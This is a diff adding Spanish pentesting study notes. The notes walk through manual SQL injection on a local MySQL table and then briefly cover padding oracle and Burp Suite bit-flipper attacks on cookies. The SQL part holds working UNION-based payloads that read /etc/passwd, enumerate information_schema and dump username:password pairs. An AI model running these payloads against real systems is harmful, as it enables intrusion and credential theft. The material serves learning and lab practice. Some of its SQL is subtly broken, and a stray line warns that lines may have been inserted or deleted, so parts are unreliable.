@@ -415,3 +415,64 @@ Esta herramienta automatiza las inyecciones SQL y para su uso podemos leerlo por
 
  - *Manera manual*
 
+Para entender como funciona la vulnerabilidad debemos intentarlo por nuestra cuenta, primero nos creamos una base de datos
+para jugar
+
+```bash
+service mysql start
+mysql -uroot
+create table Tabla1(id int(2), username varchar(32), password(32));
+??? desde aquí hasta ???FIN las líneas pueden haber sido insertadas/borradas
+insert into Tabla1(id, username, password) values (1, "username", "password");
+select * from Tabla1;
+select * from Tabla1 where id = 1; #Selecciona los datos con la id que pongas
+select * from Tabla1 where id = 1 order by 100;-- -; #Hace un ordenamiento de datos en base a la columna 100
+select * from Tabla1 where id = 1 union select 1,2,3,4;-- -; #Donde los numeros 1,2,3,4 pueden ser reemplazados por código
+select * from Tabla1 where id = 1 union select @@version, database(), user(), load_file('/etc/passwd');
+```
+En el código anterior vemos distintos parametros
+
+**@@version** : Muestra la versión de la base de datos
+
+**database()** : Muestra la base de datos que se está usando
+
+**user()** : Nombra el usuario que usa la base de datos
+
+**load_file('')** : Carga un archivo que se coloque en las comillas
+
+Para listar la base de datos de manera alternativa podemos usar el siguiente código:
+
+```bash
+select * from Tabla1 where id= 1 union select 1,schema_name,3,4 from information_schema.schemata
+```
+
+Para listar las tablas de una base de dato de manera alternativa usamos el siguiente código:
+
+```bash
+select * from Tabla1 where id= 1 union select 1,table_name,3,4 from information_schema.tables where table_schema = 'Table1';-- -;
+```
+
+Para listar las columnas el siguiente código:
+
+```bash
+select * from Tabla1 where id=1 union select 1, column_name,3,4 from information_schema.columns where table_schema='Table1' and table_name='Nombre_de_la_tabla' 
+```
+
+Para poder listar los datos que ya sabemos que la base de datos tiene podemos usar el siguiente código:
+
+```bash
+select * from Tabla1 where id=1 union select 1, concat(username,0x3a,password),3,4 from Tabla1.'Nombre_de_la_tabla'
+```
+
+## Vulnerabilidad Padding Oracle Attack - Padbuster
+
+Esta vulnerabilidad no solo se aplica en las páginas web si no en cualquiera que utilice un algoritmo de cifrado de bloques de longitud variable (es decir que necesita usar relleno o padding) y son vulnerables.
+
+[Explotar padding oracle para obtener claves de cifrado](https://www.hackplayers.com/2018/10/explotar-padding-oracle-para-obtener-clave.html)
+ 
+ - Padding Oracle Attack - BurpSuite Bit Flipper Attack
+
+Para este tipo de ataques utilizamos el burpsuit, mandamos el código fuente al intruder después cargamos un payload a la cookie y marcamos un ataque de tipo Bit Flipper y lo dejamos correr.
+
+Con esta función automatiza el ataque y te envía la cookie correcta que buscas.
+
